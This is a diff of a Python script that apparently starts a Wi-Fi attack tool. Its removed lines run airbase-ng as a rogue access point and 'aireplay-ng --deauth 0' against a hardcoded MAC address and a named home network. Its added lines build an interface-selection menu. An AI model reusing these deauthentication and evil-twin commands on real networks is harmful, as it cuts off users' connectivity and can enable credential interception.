@@ -1,18 +1,61 @@
+#IMPORT DEPENDENCYS
+from tld import get_tld
+import sys
+import os
+import json
 import subprocess
 import time
-import os
 import pandas
-from tld import get_tld
+import nmap
+import netifaces
 
-MAC = '30:D3:2D:19:18:FC'
-essid = 'Casal\ do\ Mar\ QP'
-Channel = '11'
-interface = 'wlp3s0mon'
+W = '\033[0m' # white (normal)
+R = '\033[31m' # red
+G = '\033[32m' # green
+O = '\033[33m' # orange
+B = '\033[34m' # blue
+P = '\033[35m' # purple
+C = '\033[36m' # cyan
+GR = '\033[37m' # gray
+D = '\033[2m' # dims current color. {W} resets.
+Plus = f'{W}{D}[{W}{G}+{W}{D}]{W}' #[+]
+Danger = f'{O}[{R}!{O}]{W}' #[!]
+WTF = f'{W}[{C}?{W}]' #[?]
 
-def start():
+#OS to clean the screen
+def OS():
+    os.system('cls' if os.name == 'nt' else 'clear')
 
-    os.system('sudo ')
-    os.system(f'sudo xterm -title TEST -fg green -geometry 100x20-0+0 -e sudo airbase-ng -a {MAC} --essid {essid} -c {Channel} {interface}
-              & sudo xterm -title TEST -fg red -geometry 100x20-0+0 -e sudo aireplay-ng --deauth 0 -a {MAC}')
 
-start()
+def InterfaceSelect():
+
+    global interface
+    global mode
+
+    #Netifaces
+    NetworkInterfaces = netifaces.interfaces()
+
+    OS()
+    print()
+    print(f'{B}********** Please select an interface **********')
+    print(*(W + '{}) {}'.format(x, y) for (x, y) in enumerate(NetworkInterfaces, 1)), sep='\n')
+    print()
+    print(f'{C}----------')
+    print(f'{G}Note: {W}Please write the interface the way it shows in the menu!')
+    print(f'{C}----------')
+    print(f'{P}Contribution: {W}We are looking for a way to make it so you dont need to write the hole interface name and only a number!')
+    print(f'{C}----------{W}')
+    print()
+    NumberInterface = int(input('Please write the interface you want to use: '))
+
+    After = NumberInterface - 1
+    interface = str(NetworkInterfaces[After:NumberInterface])
+    inte = interface[2:-2]
+
+    print(NetworkInterfaces)
+    print(NumberInterface)
+    print(interface)
+    print(inte)
+
+
+InterfaceSelect()
